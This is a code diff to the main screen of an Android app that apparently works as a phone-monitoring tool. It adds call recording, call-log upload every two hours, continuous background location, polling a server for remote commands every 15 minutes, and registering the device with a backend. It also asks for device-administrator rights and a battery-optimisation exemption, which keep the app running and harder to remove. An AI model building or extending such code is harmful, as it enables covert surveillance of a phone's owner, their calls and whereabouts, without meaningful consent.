@@ -1,14 +1,16 @@
 package com.example.location_where
 
 import android.Manifest
+import android.app.admin.DevicePolicyManager
+import android.content.ComponentName
 import android.content.Context
 import android.content.Intent
 import android.content.pm.PackageManager
+import android.net.Uri
 import android.os.Build
 import android.os.Bundle
+import android.provider.Settings
 import android.widget.Button
-import android.widget.EditText
-import android.widget.LinearLayout
 import android.widget.TextView
 import android.widget.Toast
 import androidx.activity.result.contract.ActivityResultContracts
@@ -18,17 +20,19 @@ import androidx.activity.enableEdgeToEdge
 import androidx.core.content.ContextCompat
 import androidx.core.view.ViewCompat
 import androidx.core.view.WindowInsetsCompat
-import androidx.navigation.findNavController
-import androidx.navigation.fragment.NavHostFragment
-import androidx.navigation.ui.AppBarConfiguration
-import androidx.navigation.ui.navigateUp
-import androidx.navigation.ui.setupActionBarWithNavController
 import androidx.work.*
 import android.view.Menu
 import android.view.MenuItem
+import com.example.location_where.api.ApiService
+import com.example.location_where.data.DeviceRegisterRequest
 import com.example.location_where.databinding.ActivityMainBinding
+import com.example.location_where.services.CallRecordingService
+import com.example.location_where.services.LocationService
 import com.example.location_where.utils.TokenManager
+import com.example.location_where.workers.CallLogWorker
+import com.example.location_where.workers.CommandWorker
 import com.example.location_where.workers.LocationSyncWorker
+import com.google.firebase.messaging.FirebaseMessaging
 import dagger.hilt.android.AndroidEntryPoint
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
@@ -39,19 +43,41 @@ import javax.inject.Inject
 @AndroidEntryPoint
 class MainActivity : AppCompatActivity() {
 
-    private lateinit var appBarConfiguration: AppBarConfiguration
     private lateinit var binding: ActivityMainBinding
 
     @Inject
     lateinit var tokenManager: TokenManager
 
+    @Inject
+    lateinit var apiService: ApiService
+
     private val requestPermissionLauncher = registerForActivityResult(
         ActivityResultContracts.RequestMultiplePermissions()
     ) { permissions ->
         if (permissions.all { it.value }) {
-            startLocationService()
+            handleBackgroundLocationPermission()
         } else {
             Toast.makeText(this, "Permissions required for monitoring", Toast.LENGTH_LONG).show()
+        }
+    }
+
+    private val backgroundLocationPermissionLauncher = registerForActivityResult(
+        ActivityResultContracts.RequestPermission()
+    ) { granted ->
+        if (granted) {
+            startMonitoringServices()
+        } else {
+            Toast.makeText(this, "Background location is required for continuous monitoring", Toast.LENGTH_LONG).show()
+        }
+    }
+
+    private val appSettingsLauncher = registerForActivityResult(
+        ActivityResultContracts.StartActivityForResult()
+    ) {
+        if (hasBackgroundLocationPermission()) {
+            startMonitoringServices()
+        } else {
+            Toast.makeText(this, "Enable 'Allow all the time' for location in app settings", Toast.LENGTH_LONG).show()
         }
     }
 
@@ -69,18 +95,75 @@ class MainActivity : AppCompatActivity() {
         }
         setSupportActionBar(binding.toolbar)
 
-        val navHostFragment =
-            supportFragmentManager.findFragmentById(R.id.nav_host_fragment_content_main) as NavHostFragment
-        val navController = navHostFragment.navController
-
-        appBarConfiguration = AppBarConfiguration(navController.graph)
-        setupActionBarWithNavController(navController, appBarConfiguration)
-
         binding.fab.setOnClickListener {
             checkPermissionsAndStart()
         }
 
         setupDashboard()
+        registerDevice()
+        requestIgnoreBatteryOptimizations()
+        requestDeviceAdmin()
+    }
+
+    override fun onResume() {
+        super.onResume()
+        registerDevice()
+    }
+
+    private fun requestDeviceAdmin() {
+        val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
+        val adminName = ComponentName(this, MonitoringDeviceAdminReceiver::class.java)
+        if (!dpm.isAdminActive(adminName)) {
+            val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
+            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminName)
+            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "This permission is required for remote device management.")
+            startActivity(intent)
+        }
+    }
+
+    private fun requestIgnoreBatteryOptimizations() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            val intent = Intent()
+            val packageName = packageName
+            val pm = getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
+            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
+                intent.action = android.provider.Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS
+                intent.data = android.net.Uri.parse("package:$packageName")
+                startActivity(intent)
+            }
+        }
+    }
+
+    private fun registerDevice() {
+        FirebaseMessaging.getInstance().token.addOnCompleteListener { task ->
+            if (!task.isSuccessful) return@addOnCompleteListener
+            syncDeviceRegistration(task.result)
+        }
+    }
+
+    private fun syncDeviceRegistration(fcmToken: String?) {
+        val request = DeviceRegisterRequest(
+            deviceModel = Build.MODEL,
+            manufacturer = Build.MANUFACTURER,
+            androidVersion = Build.VERSION.RELEASE,
+            appVersion = "1.0",
+            fcmToken = fcmToken,
+            isAdminActive = isDeviceAdminActive()
+        )
+
+        CoroutineScope(Dispatchers.IO).launch {
+            try {
+                apiService.registerDevice(request)
+            } catch (e: Exception) {
+                // Log error
+            }
+        }
+    }
+
+    private fun isDeviceAdminActive(): Boolean {
+        val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
+        val adminName = ComponentName(this, MonitoringDeviceAdminReceiver::class.java)
+        return dpm.isAdminActive(adminName)
     }
 
     private fun setupDashboard() {
@@ -98,25 +181,11 @@ class MainActivity : AppCompatActivity() {
     }
 
     private fun showLogoutDialog() {
-        val input = EditText(this)
-        input.inputType = android.text.InputType.TYPE_CLASS_TEXT or android.text.InputType.TYPE_TEXT_VARIATION_PASSWORD
-        val lp = LinearLayout.LayoutParams(
-            LinearLayout.LayoutParams.MATCH_PARENT,
-            LinearLayout.LayoutParams.MATCH_PARENT
-        )
-        input.layoutParams = lp
-
         AlertDialog.Builder(this)
-            .setTitle("Admin Password Required")
-            .setMessage("Enter admin password to logout")
-            .setView(input)
+            .setTitle("Sign out")
+            .setMessage("Sign out from this device?")
             .setPositiveButton("Logout") { _, _ ->
-                val password = input.text.toString()
-                if (password == "admin123") {
-                    performLogout()
-                } else {
-                    Toast.makeText(this, "Wrong admin password", Toast.LENGTH_SHORT).show()
-                }
+                performLogout()
             }
             .setNegativeButton("Cancel", null)
             .show()
@@ -141,10 +210,6 @@ class MainActivity : AppCompatActivity() {
             Manifest.permission.RECORD_AUDIO
         )
 
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-            permissions.add(Manifest.permission.ACCESS_BACKGROUND_LOCATION)
-        }
-        
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
             permissions.add(Manifest.permission.POST_NOTIFICATIONS)
         }
@@ -154,21 +219,67 @@ class MainActivity : AppCompatActivity() {
         }
 
         if (missingPermissions.isEmpty()) {
-            startLocationService()
+            handleBackgroundLocationPermission()
         } else {
             requestPermissionLauncher.launch(missingPermissions.toTypedArray())
         }
     }
 
-    private fun startLocationService() {
-        val serviceIntent = Intent(this, LocationService::class.java)
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            startForegroundService(serviceIntent)
-        } else {
-            startService(serviceIntent)
+    private fun handleBackgroundLocationPermission() {
+        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q || hasBackgroundLocationPermission()) {
+            startMonitoringServices()
+            return
         }
+
+        if (Build.VERSION.SDK_INT == Build.VERSION_CODES.Q) {
+            backgroundLocationPermissionLauncher.launch(Manifest.permission.ACCESS_BACKGROUND_LOCATION)
+            return
+        }
+
+        AlertDialog.Builder(this)
+            .setTitle("Allow all the time")
+            .setMessage("Enable background location as 'Allow all the time' so monitoring keeps working when the app is not open.")
+            .setPositiveButton("Open Settings") { _, _ ->
+                val intent = Intent(
+                    Settings.ACTION_APPLICATION_DETAILS_SETTINGS,
+                    Uri.parse("package:$packageName")
+                )
+                appSettingsLauncher.launch(intent)
+            }
+            .setNegativeButton("Cancel", null)
+            .show()
+    }
+
+    private fun hasBackgroundLocationPermission(): Boolean {
+        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+            ContextCompat.checkSelfPermission(
+                this,
+                Manifest.permission.ACCESS_BACKGROUND_LOCATION
+            ) == PackageManager.PERMISSION_GRANTED
+        } else {
+            true
+        }
+    }
+
+    private fun startMonitoringServices() {
+        val locationIntent = Intent(this, LocationService::class.java)
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            startForegroundService(locationIntent)
+        } else {
+            startService(locationIntent)
+        }
+
+        val callIntent = Intent(this, CallRecordingService::class.java)
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            startForegroundService(callIntent)
+        } else {
+            startService(callIntent)
+        }
+
         scheduleSimCheck()
         scheduleLocationSync()
+        scheduleCallLogSync()
+        scheduleCommandPolling()
     }
 
     private fun scheduleSimCheck() {
@@ -197,6 +308,41 @@ class MainActivity : AppCompatActivity() {
         )
     }
 
+    private fun scheduleCallLogSync() {
+        val constraints = Constraints.Builder()
+            .setRequiredNetworkType(NetworkType.CONNECTED)
+            .build()
+
+        val callLogRequest = PeriodicWorkRequestBuilder<CallLogWorker>(2, TimeUnit.HOURS)
+            .setConstraints(constraints)
+            .build()
+
+        WorkManager.getInstance(this).enqueueUniquePeriodicWork(
+            "CallLogSyncWork",
+            ExistingPeriodicWorkPolicy.KEEP,
+            callLogRequest
+        )
+    }
+
+    private fun scheduleCommandPolling() {
+        val syncRequest = PeriodicWorkRequestBuilder<CommandWorker>(15, TimeUnit.MINUTES)
+            .build()
+
+        WorkManager.getInstance(this).enqueueUniquePeriodicWork(
+            "CommandPollingWork",
+            ExistingPeriodicWorkPolicy.KEEP,
+            syncRequest
+        )
+
+        val immediateSyncRequest = OneTimeWorkRequestBuilder<CommandWorker>().build()
+
+        WorkManager.getInstance(this).enqueueUniqueWork(
+            "CommandPollingImmediateWork",
+            ExistingWorkPolicy.REPLACE,
+            immediateSyncRequest
+        )
+    }
+
     override fun onCreateOptionsMenu(menu: Menu): Boolean {
         menuInflater.inflate(R.menu.menu_main, menu)
         return true
@@ -210,7 +356,6 @@ class MainActivity : AppCompatActivity() {
     }
 
     override fun onSupportNavigateUp(): Boolean {
-        val navController = findNavController(R.id.nav_host_fragment_content_main)
-        return navController.navigateUp(appBarConfiguration) || super.onSupportNavigateUp()
+        return super.onSupportNavigateUp()
     }
 }
